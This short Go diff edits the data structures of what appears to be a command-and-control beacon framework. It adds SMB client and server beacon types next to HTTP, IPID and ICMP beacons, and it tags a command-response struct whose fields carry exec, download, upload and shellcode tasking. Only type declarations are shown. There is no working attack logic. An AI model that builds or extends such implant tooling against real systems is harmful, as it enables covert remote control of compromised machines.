@@ -6,6 +6,16 @@ type BeaconHttp struct {
 	proxyClients []Beacon
 }
 
+type BeaconSmbClient struct {
+	beacon Beacon
+}
+
+type BeaconSmbServer struct {
+	data []byte 
+	msgBuffer []string
+	initialized bool
+}
+
 type BeaconIPID struct {
 	data []byte
 	proxyClients []Beacon
@@ -17,16 +27,16 @@ type BeaconICMP struct {
 }
 
 type CommandResponse struct {
-	Exec []string
-	Download []string
-	Upload []string
-	Shellcode []string
-	ProxyClients []string
+	Exec []string `json:"exec"`
+	Download []string `json:"download"`
+	Upload []string `json:"upload"`
+	Shellcode []string `json:"shellcode"`
+	ProxyClients []string `json:"proxyclients"`
 }
 
 type BeaconMessage struct {
-	Data string
-	Route string
+	Data []byte `json:"Data"`
+	Route []byte `json:"Route"`
 }
 
 type CommandUpdate struct {
